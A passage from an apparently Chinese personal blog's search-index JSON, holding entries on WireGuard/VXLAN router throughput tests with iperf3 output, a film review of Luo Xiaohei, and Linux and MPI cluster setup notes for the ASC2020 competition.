8,nop,nop,sackOK], length 0\n</code></pre>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u5176\u5b83\u95ee\u9898","title":"\u5176\u5b83\u95ee\u9898","text":"","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u4f7f\u7528-dhcp-option-\u7f13\u89e3-mtu-\u95ee\u9898","title":"\u4f7f\u7528 dhcp option \u7f13\u89e3 MTU \u95ee\u9898","text":"<p>\u867d\u7136 wg \u80fd\u89e3\u51b3 MTU \u95ee\u9898\uff0c\u4f46\u662f\u4f1a\u5e26\u6765\u4e0d\u5c0f\u7684\u635f\u8017\u3002\uff08wg \u5c42\u548c vxlan \u5c42\u90fd\u8981\u5206\u7247\uff09\uff0c\u6bd4\u8f83\u597d\u7684\u60c5\u51b5\u662f\u907f\u514d wg \u5c42\u7684\u5206\u7247\uff0c\u524d\u63d0\u662f vxlan \u5c42\u6240\u6709\u8bbe\u5907\u6b63\u786e\u8bbe\u7f6e\u4e86 MTU\u3002</p> <p>\u4e0d\u8fc7\u6709\u4e9b\u8bbe\u5907\u4e0d\u4f1a\u8bf7\u6c42 dhcp mtu \u9009\u9879\uff0c\u56e0\u6b64\u8be5\u65b9\u6848\u5bf9\u5176\u65e0\u6548\u3002\u4e0d\u8fc7\u5bf9\u4e8e\u652f\u6301\u7684\u8bbe\u5907\uff0c\u786e\u5b9e\u80fd\u8d77\u5230\u4f18\u5316\u7684\u6548\u679c\u3002</p>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u6d4b\u901f","title":"\u6d4b\u901f","text":"","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#wg-\u7ec4\u7f51\u6027\u80fd\u6d4b\u8bd5","title":"wg \u7ec4\u7f51\u6027\u80fd\u6d4b\u8bd5","text":"<p>\u6d4b\u8bd5 jcg_q30p wg \u7ec4\u7f51\u6027\u80fd</p> <pre><code>root@JCG_Q30P \u279c  ~ iperf3 -c 192.168.35.1\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.00  sec   499 MBytes   419 Mbits/sec    0             sender\n[  5]   0.00-10.01  sec   497 MBytes   417 Mbits/sec                  receiver\n\nroot@JCG_Q30P \u279c  ~ iperf3 -c 192.168.35.1 -R\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.00  sec   525 MBytes   440 Mbits/sec  2069             sender\n[  5]   0.00-10.00  sec   522 MBytes   437 Mbits/sec                  receiver\n</code></pre> <p>\u52a0\u4e0a NAT\uff1a\u4ecd\u7136\u662f 400\u3002<code>iperf3 -B 192.168.1.1 -c op1.op1</code></p> <p>\u548c wg-bench \u6d4b\u5f97\u7ed3\u679c\u76f8\u8fd1</p>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u65e0\u7ebf\u4e0b-l2-\u548c-l3-\u6027\u80fd","title":"\u65e0\u7ebf\u4e0b L2 \u548c L3 \u6027\u80fd","text":"","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u4fe1\u9053\u5f71\u54cd","title":"\u4fe1\u9053\u5f71\u54cd","text":"<ul> <li>\u4fe1\u9053\u662f\u5426\u53d7\u5e72\u6270\u662f\u6700\u5f71\u54cd\u7ed3\u679c\u7684<ul> <li>36 \u4fe1\u9053\u548c\u5176\u4ed6\u51b2\u7a81\uff1a\u5e73\u5747 230\uff08L2\uff0c\u4e0b\u540c\uff09</li> <li>149 \u4fe1\u9053\u7a0d\u5fae\u6ca1\u51b2\u7a81\uff1a\u5e73\u5747290</li> <li>162\uff08AU\uff09\u5b8c\u5168\u6ca1\u51b2\u7a81\uff1a\u5e73\u5747 330\uff0c\u4f46\u662f\u53ea\u6709\u7535\u8111\u80fd\u8fde\uff0c\u624b\u673a\u626b\u4e0d\u51fa wifi\u3002</li> <li>\u4ee5\u4e0a\u503c\u662f\u4fe1\u53f7\u5f3a\u5ea6\u5927\u6982\u5728 -60dBm\uff0c\u9694\u4e86\u4e00\u5b9e\u9a8c\u5ba4\u4e00\u4e2a\u8584\u7684\u5899</li> <li>\u6700\u540e\u53d1\u73b0\u8bbe\u7f6e\u6210 CN + auto + 80MHz \u5373\u53ef\u3002160 MHz \u5728\u6709\u5e72\u6270+\u4fe1\u53f7\u4e0d\u5f3a\u60c5\u51b5\u4e0b\u57fa\u672c\u4e0a\u8d77\u4e0d\u5230\u4f5c\u7528\u3002\u4e0d\u8bbe\u7f6e CN \u7684\u8bdd\uff0c\u4f1a auto \u5230\u975e\u6cd5\u4fe1\u9053\uff08\u6bd4\u5982 \uff0c\u7535\u8111\u53ef\u4ee5</li> </ul> </li> </ul> <p>\u8bbe\u7f6e\u6210 160Mhz \u5e72\u6270\u592a\u5927 </p> <p>\u7eaf\u65e0\u7ebf\u6027\u80fd\uff08\u76f4\u63a5 iperf jcg_q30p\uff09 - send\uff1a350 - receive\uff1a300 \u548c 677 \u90fd\u6d4b\u5230\u8fc7\u3002</p>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#-60dbm","title":"-60dBm","text":"<p>L2\uff1a257/320\uff08up/down\uff09 L3\uff1a300/340</p> <p>\u8bbe\u7f6e\u7b14\u8bb0\u672c WLAN mtu=1370 L2\uff1a270/300 L3\uff1a300/330</p>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#-65dbm","title":"-65dBm","text":"<p>\u9694\u4e86\u4e00\u5835\u539a\u5899\uff0c\u4fe1\u53f7\u53ea\u6709 -65 dBm \u7684\u60c5\u51b5\u4e0b\uff0ckvm-win11 \u6d4b\u8bd5</p> <p>L3</p> <pre><code>$ iperf3.exe -B 192.168.1.135 -c 192.168.1.1\n- - - - - - - - - - - - - - - - - - - - - - - - -\n[ ID] Interval           Transfer     Bitrate\n[  5]   0.00-10.01  sec  71.4 MBytes  59.8 Mbits/sec                  sender\n[  5]   0.00-10.06  sec  71.2 MBytes  59.4 Mbits/sec                  receiver\n\n$ iperf3.exe -B 192.168.1.135 -c 192.168.1.1 -R\n- - - - - - - - - - - - - - - - - - - - - - - - -\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.03  sec   200 MBytes   167 Mbits/sec    0             sender\n[  5]   0.00-10.00  sec   197 MBytes   165 Mbits/sec                  receiver\n\n$ iperf3.exe -B 192.168.1.135 -c 192.168.35.2\n- - - - - - - - - - - - - - - - - - - - - - - - -\n[ ID] Interval           Transfer     Bitrate\n[  5]   0.00-10.01  sec  69.0 MBytes  57.8 Mbits/sec                  sender\n[  5]   0.00-10.39  sec  67.2 MBytes  54.2 Mbits/sec                  receiver\n\n$ iperf3.exe -B 192.168.1.135 -c 192.168.35.2 -R\n- - - - - - - - - - - - - - - - - - - - - - - - -\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.05  sec   202 MBytes   168 Mbits/sec    0             sender\n[  5]   0.00-10.00  sec   198 MBytes   166 Mbits/sec                  receiver\n</code></pre> <p>L2</p> <pre><code>$ iperf3.exe -B 192.168.35.135 -c 192.168.35.2 -R\n- - - - - - - - - - - - - - - - - - - - - - - - -\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.05  sec   194 MBytes   162 Mbits/sec   10             sender\n[  5]   0.00-10.00  sec   191 MBytes   160 Mbits/sec                  receiver\n\n$ iperf3.exe -B 192.168.35.135 -c 192.168.35.2\n- - - - - - - - - - - - - - - - - - - - - - - - -\n[ ID] Interval           Transfer     Bitrate\n[  5]   0.00-10.00  sec  71.2 MBytes  59.8 Mbits/sec                  sender\n[  5]   0.00-10.08  sec  71.1 MBytes  59.2 Mbits/sec                  receiver\n</code></pre>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E4%B8%AA%E4%BA%BA/2019/09/30/2019-09-30-%E7%BD%97%E5%B0%8F%E9%BB%91%E6%88%98%E8%AE%B0%EF%BC%8C%E7%A5%A8%E6%88%BF%E5%86%B2%E9%B8%AD%EF%BC%81/","title":"\u7f57\u5c0f\u9ed1\u6218\u8bb0","text":"<p>\u4eca\u5929\u53bb\u770b\u5c0f\u9ed1\u7535\u5f71\u4e86\uff0c\u53d1\u751f\u4e86\u8bb8\u591a\u6709\u8da3\u7684\u4e8b\u60c5\u3002</p> <p>14:20 \u51fa\u95e8\u65f6\u9047\u5230 lfy \u4e86\uff0c\u4ed6\u4ec0\u4e48\u90fd\u4e0d\u5e26\u8981\u53bb\u671d\u5929\u95e8\u73a9\u3002\u6211\u4eec\u521a\u597d\u987a\u8def\uff0c\u90fd\u8981\u53bb\u4e09\u5ce1\u5e7f\u573a\uff08sb \u5730\u56fe\uff0c\u63a8\u8350\u6211\u5750\u534a\u4e2a\u5c0f\u65f6\u516c\u4ea4\u8f66\u7ed5\u8def\u53bb\uff0c\u5e78\u597d fy \u63d0\u9192\u4e86\u6211\u8d70\u8def\u53bb\uff0c\u53ea\u8d70\u4e86\u4e0d\u5230 10 \u5206\u949f\u5c31\u5230\u4e86\uff09\u3002</p> <p>\u5230\u4e86\u7535\u5f71\u9662\u540e\uff0c\u53d1\u73b0\u7535\u5f71\u9662\u5176\u5b9e\u633a\u5c0f\u7684\uff0c\u5927\u5385\u5c31\u662f\u7b49\u5019\u5ba4\uff0c\u51e0\u6392\u706b\u8f66\u7ad9\u7684\u90a3\u79cd\u6905\u5b50\u3002\u7531\u4e8e\u6211\u65e9\u4e86 40 \u591a\u5206\u949f\uff0c\u4fbf\u5750\u5728\u90a3\u513f\u7b49\u3002</p> <p>\u5165\u573a\u4e86\uff0c\u679c\u7136\u6765\u7684\u4eba\u5f88\u5c11\u3002\u6211\u524d\u8fb9\u53ea\u6709\u4e00\u5bf9\u60c5\u4fa3\uff0c\u6211\u53f3\u8fb9\u6ca1\u4eba\uff0c\u5de6\u8fb9\u662f\u4e09\u4e2a\u59b9\u7eb8\uff08\u600e\u4e48\u611f\u89c9\u6709\u70b9\u5e78\u8fd0\uff0c\u201c\u81ea\u52a8\u53d8\u8272\u201d\uff09\uff0c\u540e\u9762\u6211\u53ea\u6ce8\u610f\u5230\u4e86\u4e00\u5bf9\u7537\u751f\uff0c\u4ee5\u53ca\u4e00\u4f4d\u5e74\u7eaa\u597d\u50cf\u8fd8\u633a\u5927\u7684\u963f\u59e8\uff08\u96be\u9053\u662f\u771f\u7231\uff1f\u611f\u89c9\u5927\u4eba\u770b\u52a8\u753b\u7535\u5f71\u7684\u53ea\u4f1a\u662f\u4e00\u5bb6\u4eba\u7684\u60c5\u51b5\u5440\uff09\u3002</p> <p>\u7535\u5f71\u5f00\u59cb\u4e86\uff08\u4e4b\u524d\u90fd\u662f\u9ed1\u5c4f\uff0c\u5728\u5f00\u59cb\u524d 2 \u5206\u949f\u5f00\u59cb\u653e\u5e7f\u544a\uff0c\u5982\u679c\u9ed1\u5c4f\u7684\u65f6\u95f4\u91cc\u653e\u548c\u5c0f\u9ed1\u6709\u5173\u7684\u5ba3\u4f20\u7247\u591a\u597d\u5440\uff0c\u4e0d\u77e5\u9053\u9996\u6620\u7684\u65f6\u5019\u4f1a\u4e0d\u4f1a\u653e\uff09\u3002</p> <p>\u64ad\u653e\u6ca1\u51e0\u5206\u949f\uff0c\u7a81\u7136\u9ed1\u5c4f\u4e86\u3002\u53f0\u4e0b\u5f00\u59cb\u53ea\u8a00\u7247\u8bed\u8d77\u6765\uff0c\u53ea\u542c\u89c1\u5de6\u8fb9\u7684\u4e09\u4e2a\u5973\u751f\u4e2d\u4e24\u4e2a\u5916\u5411\u70b9\u5973\u751f\u8c03\u4f83\u7b2c\u4e00\u6b21\u51fa\u6765\u5c31\u8fd0\u6c14\u8fd9\u4e48\u4e0d\u597d\uff0c\u8fd8\u8bf4\u8fd8\u4e0d\u5982\u53bb\u5403\u4e1c\u897f\uff0c\u63a5\u7740\u8bf4\u8981\u4e0d\u8981\u53bb\u9000\u7968\u3002\u4e0d\u8fc7\u4e2d\u95f4\u7684\u5973\u751f\u8bf4\u5979\u8fd8\u60f3\u770b\u770b\uff0c\u5979\u4eec\u53ef\u4ee5\u53bb\u95ee\u95ee\u80fd\u4e0d\u80fd\u9000\u7968\uff08\u8fd9\u624d\u662f\u771f\u7231\u5440\uff0c\u63a8\u65ad\u5e94\u8be5\u662f\u5979\u5b89\u5229\u5979\u4eec\u4e24\u4e2a\u8fc7\u6765\u770b\u7684\uff09\u3002\u7136\u540e\u6700\u5de6\u8fb9\u7684\u5973\u751f\u4fbf\u4e3b\u52a8\u51fa\u53bb\u53eb\u5de5\u4f5c\u4eba\u5458\u4e86\u3002\u51e0\u5206\u949f\u540e\u8bbe\u5907\u5f04\u597d\u4e86\uff0c\u7535\u5f71\u7ee7\u7eed\u3002</p>","tags":["\u7f57\u5c0f\u9ed1"]},{"location":"%E4%B8%AA%E4%BA%BA/2019/09/30/2019-09-30-%E7%BD%97%E5%B0%8F%E9%BB%91%E6%88%98%E8%AE%B0%EF%BC%8C%E7%A5%A8%E6%88%BF%E5%86%B2%E9%B8%AD%EF%BC%81/#\u89c2\u611f","title":"\u89c2\u611f","text":"<p>\u53ea\u8981\u4f60\u5439\u7f57\u5c0f\u9ed1\uff0c\u6211\u4eec\u5c31\u662f\u597d\u670b\u53cb\u3002 \u5267\u60c5\u5341\u5206\u7d27\u51d1\uff0c\u57fa\u672c\u6ca1\u6709\u4ec0\u4e48\u5e9f\u8bdd\u3002\u5267\u60c5\u8854\u63a5\u6d41\u7545\u81ea\u7136\u3002\u7535\u5f71\u4ece\u4e2d\u95f4\u5f00\u59cb\uff0c\u4e00\u8def\u70ab\u9177\u6253\u6597\uff0c\u9ad8\u6f6e\u4e0d\u65ad\u3002\u7ed3\u5c3e\u4e5f\u4e0d\u62d6\u6c93\uff0c\u98ce\u606f\u5316\u4f5c\u68ee\u6797\uff0c\u5c0f\u9ed1\u8ba4\u65e0\u9650\u4e3a\u5e08\u7236\u7ee7\u7eed\u6d41\u6d6a\uff0c\u4e00\u5207\u90fd\u91ca\u7136\u4e86\u3002\u7ed3\u5c3e\u7684\u4e5f\u6709\u5f69\u86cb\uff0c\u5c71\u65b0\u5bf9\u5c0f\u767d\u8bf4\uff08\u5c71\u65b0\uff09\u8bf4\uff1a\u201c\u65e9\u665a\u6709\u4e00\u5929\u4f60\u4f1a\u9047\u5230\u4f60\u751f\u547d\u4e2d\u7684\u90a3\u53ea\u732b\u7684\u201d\uff0c\u8854\u63a5\u4e86 TV \u7248\u3002</p>","tags":["\u7f57\u5c0f\u9ed1"]},{"location":"%E4%B8%AA%E4%BA%BA/2019/09/30/2019-09-30-%E7%BD%97%E5%B0%8F%E9%BB%91%E6%88%98%E8%AE%B0%EF%BC%8C%E7%A5%A8%E6%88%BF%E5%86%B2%E9%B8%AD%EF%BC%81/#\u603b\u7ed3","title":"\u603b\u7ed3","text":"<p>\u6211\u559c\u6b22\u5c0f\u9ed1\u7684\u539f\u56e0\u5c31\u662f\u56e0\u4e3a\u4ed6\u91cc\u9762\u4e00\u5207\u90fd\u5f88\u7eaf\u7cb9\uff0c\u6ca1\u6709\u574f\u4eba\uff0c\u6ca1\u6709\u9634\u8c0b\u8be1\u8ba1\u3002\u6240\u4ee5\u770b\u5f97\u5341\u5206\u8212\u670d\u3002\u7535\u5f71\u6709\u4e30\u5bcc\u6709\u8da3\u7684\u7b11\u70b9\u3002\u610f\u5883\u4e5f\u5f88\u7f8e\u2014\u2014\u8302\u5bc6\u7684\u68ee\u6797\uff0c\u9e21\u72ac\u76f8\u95fb\u7684\u4e61\u6751\uff0c\u519c\u7530\uff0c\u591c\u665a\uff0c\u661f\u661f\uff0c\u5927\u6d77\uff0c\u7e41\u534e\u7684\u90fd\u5e02\uff0c\u4e00\u5207\u90fd\u662f\u90a3\u4e48\u7684\u5e73\u8861\uff0c\u90fd\u8ba9\u4eba\u611f\u53f9\u4e16\u754c\u771f\u7f8e\u3002\u4eba\u7269\u6027\u683c\u9c9c\u6d3b\u5206\u660e\u3002</p> <p>p.s. \u4eca\u5929\u665a\u4e0a b \u7ad9\u5237\u5c0f\u9ed1\u7684\u5404\u79cd\u5468\u8fb9\u89c6\u9891\uff0c\u53d1\u73b0\u539f\u6765\u8fd9\u79cd\u98ce\u683c\u7684\u52a8\u753b\u7528\u201c\u6cbb\u6108\u201d\u6765\u63cf\u8ff0\u6bd4\u8f83\u5408\u9002\u3002</p>","tags":["\u7f57\u5c0f\u9ed1"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/02/09/2020-02-09-Vacation-routine-ASC2020-tips-up-to-02-09/","title":"Vacation routine: ASC2020 tips (up to 02/09)","text":"<p>\u8bb0\u5f55\u4e86\u8fd9\u4e48\u591a\u5929\u5f04 ASC2020 \u5b66\u5230\u7684\u4e00\u4e9b\u77e5\u8bc6\uff0c\u539f\u672c\u8bb0\u5f55\u5728 txt \u91cc:-)\uff0c\u56e0\u6b64\u6709\u70b9\u4e11\u3002</p> <pre><code>1/28\n1. apt unmet dependency (depend: xxx but not going to install) \u9519\u8bef\u7684\u53ef\u80fd\u539f\u56e0\u3002\n2. virtualbox \u7684\u5b89\u88c5\u589e\u5f3a\u529f\u80fd\u53ef\u4ee5\uff1a1\uff09\u63d0\u9ad8\u5206\u8fa8\u7387\uff1b2\uff09\u526a\u5207\u677f\u5171\u4eab\uff1b3\uff09\u5171\u4eab\u6587\u4ef6\u5939\n         \u4ee5\u53ca\u5982\u4f55\u547d\u4ee4\u884c\u624b\u52a8\u5b89\u88c5\uff1a1\uff09\u70b9\u51fb\u83dc\u5355\u680f\u91cc\u7684\u5b89\u88c5\u589e\u5f3a\u529f\u80fd\u4f1a\u5c06\u542b\u6709 addition...iso \u955c\u50cf\u7684 cdrom \u52a0\u8f7d\u3002\n   2\uff09mount /dev/cdrom \u5230\u4e00\u4e2a\u6302\u8f7d\u70b9\uff0c\u63a8\u8350/mnt/cdrom\uff08\u5373 mount /dev/cdrom /mnt/cdrom\uff09\uff0c\u5176\u4e2dcdrom\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u521b\u5efa\u3002\n   3\uff09\u5728\u6302\u8f7d\u70b9 ./V**.run \u5373\u53ef\u3002\uff08\u9700\u8981\u6709 gcc, make, perl \u624d\u80fd\u5b89\u88c5\u6210\u529f)\n3. ubuntu-server \u7248\u6ca1\u6709 X \u7a97\u53e3\u56e0\u6b64\u65e0\u6cd5\u590d\u5236\u7c98\u8d34\uff0c\u53ef\u4ee5\u901a\u8fc7 ssh \u8fde\u63a5\u3002(1. \u7f51\u7edc\u9009\u62e9\u6865\u63a5\u6a21\u5f0f 2. ifconfig \u67e5\u770b ip \u5730\u5740 3. \u8fd0\u884c sshd(server \u7248\u5b89\u88c5\u65f6\u53ef\u52fe\u9009 openssh\uff0c\u7136\u540e\u5c31\u4f1a\u9ed8\u8ba4\u5728 22 \u7aef\u53e3\u5f00\u542f ssh \u670d\u52a1) 4.ssh \u8fde\u63a5\n\n1/29\n1.  chown [-r] user:grp file\n chmod [-r] xyz file \u6216 chmod [-r] ugo+-=rwx file\n2.  \u8f6f/\u786c\u94fe\u63a5\n ln f1 f2 \u521b\u5efa\u786c\u94fe\u63a5\u3002f1, f2 \u5b8c\u5168\u5bf9\u7b49\uff0c\u5220\u9664 f1\uff0cf2 \u6587\u4ef6\u4f9d\u7136\u5b58\u5728\u3002\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u8bfe\u4e2d\u7684\u65e0\u73af\u56fe\u7ed3\u6784\u3002\u5f53\u5220\u9664\u6389\u6240\u6709\u786c\u94fe\u63a5\u540e\uff0c\u6587\u4ef6\u624d\u4f1a\u88ab\u771f\u6b63\u5220\u9664\u3002\n ln -s f1 f2 \u521b\u5efa\u8f6f\u94fe\u63a5\u3002f1 \u548c f2 \u6709\u4e3b\u4ece\u5173\u7cfb\u3002f2 \u76f8\u5f53\u4e8e\u4e00\u4e2a\u5f88\u5c0f\u7684\u5b58\u50a8\u4e86 f1 \u7684\u4f4d\u7f6e\u7684\u7279\u6b8a\u6587\u4ef6\u3002\u5220\u9664\u6389 f1 \u540e\uff0cf2 \u5931\u6548\u3002\n3. \n useradd [opt] username\n  -g \u7528\u6237\u6240\u5c5e\u7684\u7ec4\n  -G \u6307\u5b9a\u591a\u4e2a\u7ec4\n  -d \u6307\u5b9a\u7528\u6237\u4e3b\u76ee\u5f55\n  -s \u6307\u5b9a\u767b\u5f55\u7684 shell\n userdel [-r] username  -r \u4f1a\u540c\u65f6\u5220\u9664\u7528\u6237\u4e3b\u76ee\u5f55\n usermod [opt] username\n4.\n passwd \u4fee\u6539\u5f53\u524d\u7528\u6237\u5bc6\u7801\uff08\u9700\u8981\u9a8c\u8bc1\uff09\n (root)passwd username \u4fee\u6539\u6307\u5b9a\u7528\u6237\u5bc6\u7801\uff08\u65e0\u9700\u9a8c\u8bc1\uff09\n\n /etc/passwd \u6587\u4ef6\u4e00\u884c\u8bb0\u5f55\u5bf9\u5e94\u7740\u4e00\u4e2a\u7528\u6237\n example line\uff1a\n  sam:x:200:50:Sam san:/home/sam:/bin/sh\n  \u7528\u6237\u540d\uff1a\u53e3\u4ee4 (\u52a0\u5bc6\u540e\u7684\u5bc6\u7801\uff0c\u6216 x \u800c\u771f\u5b9e\u7684\u5bc6\u7801\u4f4d\u4e8e/etc/shadow):\u7528\u6237\u6807\u8bc6\u53f7\uff1a\u7ec4\u6807\u8bc6\u53f7:\u6ce8\u91ca\u6027\u63cf\u8ff0\uff1a\u4e3b\u76ee\u5f55:\u767b\u5f55 Shell\n\n /etc/shadow \u548c/etc/group \u6587\u4ef6\u683c\u5f0f\n\n02/05\n1. \u5b89\u88c5 gcc\n 1) linux \u4e0b\u5b89\u88c5\u7a0b\u5e8f\u53ef\u5206\u4e3a\uff1a\n  (1) \u6e90\u7801\u5b89\u88c5\uff1a\u9700\u8981\u6709\u7f16\u8bd1\u73af\u5883\u5982 gcc \u73af\u5883\uff0c\u76f8\u5bf9\u4e8e\u79bb\u7ebf\u5b89\u88c5\uff0c\u4e0d\u7528\u64cd\u5fc3\u4f9d\u8d56\uff0c\u5c31\u662f\u7f16\u8bd1\u65f6\u95f4\u6709\u70b9\u957f\u3002\n  (2) \u5305\u5b89\u88c5 (\u5df2\u7ecf\u7f16\u8bd1\u4e3a\u4e8c\u8fdb\u5236\u6587\u4ef6)\uff1a\u901a\u8fc7\u5305\u7ba1\u7406\u5668\n           \u5728\u7ebf\uff1a\n    yum install package\n    \u79bb\u7ebf\uff1a\n    rpm -ivh rpm \u6587\u4ef6\n   \u79bb\u7ebf\u5b89\u88c5\u9700\u8981\u624b\u52a8\u5904\u7406\u4f9d\u8d56\u3002\n    rpm -Uvh *.rpm --force --nodeps: \u5ffd\u7565\u4f9d\u8d56\u8986\u76d6\u5b89\u88c5\n  Ubuntu \u4e0b\u4e3a apt[-get]\u548c dpkg\n 3) \u5728 centos \u7684\u955c\u50cf\u7684 Packages \u4e0b\u53ef\u627e\u5230\u5404\u79cd\u7a0b\u5e8f\u7684 rpm \u6587\u4ef6\n 4) GNU/gcc \u4e2d c, c++, fortran \u5bf9\u5e94\u7f16\u8bd1\u5668\u9700\u8981\u5206\u5f00\u5b89\u88c5\n2. \u7f16\u8bd1\u5b89\u88c5 mpich2\n 1) \u82e5\u6ca1\u6709 g++, gfortran ./configure \u9700\u8981\u6dfb\u52a0--disable-c++, --disable-fortran\n 2) \u8fd8\u9700\u8981 perl \u624d\u80fd\u5b89\u88c5\u6210\u529f\n\n02/06\n1. Run an mpi cluster within a LAN\n 1) \u5728\u6bcf\u4e2a\u8282\u70b9\u521b\u5efa mpiuser(\u6dfb\u52a0\u5230 sudoers:\u4f7f\u7528 visudo \u547d\u4ee4\u6216 vi /etc/passwd)(ubuntu\u4e3a/etc/sudoers, \u66f4\u7b80\u5355\u7684\u65b9\u5f0f\u4e3a sudo usermod -aG sudo \u7528\u6237\u540d)\n     \u4fee\u6539/etc/hosts \u6587\u4ef6\n 2)  ssh-keygen -t dsa(rsa is ok, too)\n  ssh-copy-id cilent\n  ssh cilent  (\u9ed8\u8ba4\u4f7f\u7528\u5f53\u524d\u7528\u6237 mpiuser \u767b\u5165)\n 3) nfs (\u8be5 centos \u4e0a\u5df2\u7ecf\u5b89\u88c5 nfs-utils-xxx, \u65e2\u5305\u542b server \u53c8\u5305\u542b client)\n  (1) \u5728 server \u4e0a vi /etc/exports:\n   /home/mpiuser/cloud *(rw,sync,no_root_squash,no_subtree_check)\n   exportfs -arv(\u5168\u90e8\uff0c\u91cd\u65b0\uff0c\u663e\u793a\u4fe1\u606f \u6302\u8f7d)\n       \u68c0\u67e5\n   a. showmount [-ae] [hostname|IP]\n   b. rpcinfo [-p] [IP|hostname]\n   c. netstat -autp\n  (2) \u5728client\u4e0a\n   mkdir cloud\n   sudo mount -t nfs centos1:/home/mpiuser/cloud ~/cloud\n\n   sudo vi /etc/fstab:\n    #MPI CLUSTER SETUP\n    centos1:/home/mpiuser/cloud /home/mpiuser/cloud nfs\n\n   one line:\n    (root)mkdir cloud;mount -t nfs centos1:/home/mpiuser/cloud /home/mpiuser/cloud;echo 'centos1:/home/mpiuser/cloud /home/mpiuser/cloud nfs'&gt;&gt;/etc/fstab\n       check\n   df -h\n 4) mpiexec -n N --hostfile hostfile executablefile\n  N: \u8fdb\u7a0b\u6570\n     hostfile\u683c\u5f0f:\n  MPICH2: ip/host:n  n\u4e3a\u8be5\u8282\u70b9core\u6570\n  OpenMPI: ip/host slots=n\n2. run HPL\n 1) root \u5b89\u88c5\u5bfc\u81f4\u6ca1\u6709 MPdir, MPinc, MPlib\u3002\u51b3\u5b9a\u91cd\u65b0\u5b89\u88c5\u3002\n 2) mpich2 \u548c openmpi \u90fd\u662f\n  mkdir build; cd build\n  ../configure --prefix=/path/to/install\n  make; make install\n     &gt;&gt;&gt;from mpich2 README:169\n  IMPORTANT NOTE: The install directory has to be visible at exactly\n    the same path on all machines you want to run your applications\n    on. This is typically achieved by installing MPICH on a shared\n    NFS file-system. If you do not have a shared NFS directory, you\n    will need to manually copy the install directory to all machines\n    at exactly the same location.\n    &lt;&lt;&lt;\n \u5168\u5c40\u5b89\u88c5\u4f1a\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u653e\u5728/bin, /usr/bin /usr/local/bin\u7b49\u91cc\u9762, \u5e93\u653e\u5728/lib, /usr/lib\u7b49\n \u800c\u5c40\u90e8\u5b89\u88c5\u7a0b\u5e8f\u7684\u6240\u6709\u4f9d\u8d56\u4f1a\u5b58\u5728\u4e8e\u4e00\u4e2a\u6587\u4ef6\u5939\u4e0b\uff0c\u53ef\u4ee5\u590d\u5236\u79fb\u52a8\u5230\u5176\u5b83\u4f4d\u7f6e\u6267\u884c\uff1f(\u9700\u8981\u6dfb\u52a0\u73af\u5883\u53d8\u91cf)\n 3) BLAS \u5e93\u5b89\u88c5\n     ATLAS:\n     GotoBLAS2(Goto2):\n\n 4) HPL&amp;HPCG\n     HPL:\n  cp Make.&lt;arch&gt; in top-level directory\n  make arch=xxx\n  cd /bin/&lt;arch&gt;\n  run xhpl\n     HPCG:\n  cp Make.&lt;arch&gt; to top/setup directory\n  mkdir build\n  cd build\n      ../configure &lt;arch&gt;   #error1\n  make\n  cd /bin/\n  run xhpcg\n\n  #error1:/bin/sh^M: bad interpreter: No such file or directory\n  #solve:\n   vi ./configure\n   :set ff/fileformat=unix\n02/07\n1. tips\n \u5904\u7406\u5668\u578b\u53f7\uff0c\u4e3b\u9891\uff0ccache \u7b49\u4fe1\u606f\uff1acat /proc/cpuinfo\n \u5185\u5b58\u4fe1\u606f\uff1acat /proc/meminfo\n \u78c1\u76d8\u4fe1\u606f\uff1afdisk -l\n \u67e5\u770b linux \u7248\u672c\uff1alsb_release -a \n\n top: \u4efb\u52a1\u7ba1\u7406\u5668\n free -m \u67e5\u770b\u5185\u5b58\u4f7f\u7528\u72b6\u51b5\n02/08\n1. OpenMP \u4e5f\u662f\u4e00\u4e2a\u5e93\uff0c\u9700\u8981\u5b89\u88c5\uff0c\u76ee\u7684\u662f\u4f7f\u5f97\u4e00\u4e2a\u8fdb\u7a0b\u6709\u591a\u4e2a\u7ebf\u7a0b\u3002\n2. rpm \u7528\u6cd5\uff1a\n    (\u5df2\u5b89\u88c5)\n rpm -qa  all\n rpm -q pkg \u8fd4\u56de\u5e26\u7248\u672c\u7684\u5305\u540d\n rpm -qi pkg info\n 